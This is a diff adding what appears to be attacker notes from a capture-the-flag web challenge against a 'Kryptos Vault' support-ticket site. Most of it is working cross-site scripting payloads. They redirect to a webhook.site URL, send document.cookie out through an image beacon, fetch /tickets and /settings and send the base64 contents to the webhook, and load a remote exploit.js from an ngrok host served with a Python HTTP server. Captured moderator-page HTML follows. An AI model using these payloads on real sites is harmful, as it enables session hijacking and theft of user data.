@@ -1,0 +1,75 @@
+https://webhook.site/bf44f8c0-5ba5-484f-bb64-d4258764ff17
+
+
+Testing
+<script>window.location.href = 'https://webhook.site/bf44f8c0-5ba5-484f-bb64-d4258764ff17'</script>
+<script>window.location.href = 'https://webhook.site/bf44f8c0-5ba5-484f-bb64-d4258764ff17'</script>
+
+
+
+<script>var i=new Image;i.src="https://webhook.site/bf44f8c0-5ba5-484f-bb64-d4258764ff17/?"+document.cookie;</script>
+
+
+
+
+<script>javascript:fetch('/tickets').then((r)=>r.text()).then((r)=>window.location.href='https://webhook.site/bf44f8c0-5ba5-484f-bb64-d4258764ff17/'+window.btoa(r))</script>
+
+
+<body>
+        <nav class="nav-bar">
+            <ul>
+                <li>
+                    <a href="/settings">Settings</a>
+                </li>
+            </ul>
+        </nav>
+        <nav class="logged-bar">
+           <ul>
+               <li>
+                   logged in as (moderator), <a href="/logout">logout</a>
+               </li>
+           </ul>
+       </nav>
+      <div class="container on">
+         <div class="screen">
+            <h3 class="title">
+               Kryptos Vault Support tickets
+            </h3>
+            <div class="message-container">
+                
+                    <div class="ticket-card">
+                        <div class="c1"><span>Submitted </span></div>
+                        <div class="c2"><p>2022-05-18 19:52:00</p></div>
+                        <div class="c1"><span>Message </span></div>
+                        <div class="c2"><p>I have lost my rfid for the vault. My vault serial is 000083921. Please send me a new rfid.</p></div>
+                    </div>
+                
+                    <div class="ticket-card">
+                        <div class="c1"><span>Submitted </span></div>
+                        <div class="c2"><p>2022-05-18 19:52:00</p></div>
+                        <div class="c1"><span>Message </span></div>
+                        <div class="c2"><p>Vault 000076439 requires maintenance.</p></div>
+                    </div>
+
+<script>javascript:fetch('/settings').then((r)=>r.text()).then((r)=>window.location.href='https://webhook.site/bf44f8c0-5ba5-484f-bb64-d4258764ff17/'+window.btoa(r))</script>
+<div class="settings-container">
+                    <div class="settings-card">
+                        <input type="hidden" id="uid" value="100">
+                        <div class="c1"><span>New password </span></div>
+                        <div class="c2"><p><input type="text" id="password1" class="password"></p></div>
+                        <div class="c1"><span>Re-type password </span></div>
+                        <div class="c2"><p><input type="text" id="password2" class="password"></p></div>
+                    </div>
+                    <br>
+                    <b class="flash text-center" id="resp-msg">ACCESS DENIED</b>
+                    <div class="row text-center">
+                        <button  id="update-btn" name="submit">[update]</button>
+                     </div>
+
+
+<script src=""></script>
+
+<script type="text/javascript" src="https://370b-78-152-255-253.eu.ngrok.io/exploit.js"></script>
+
+
+python3 -m http.server 80
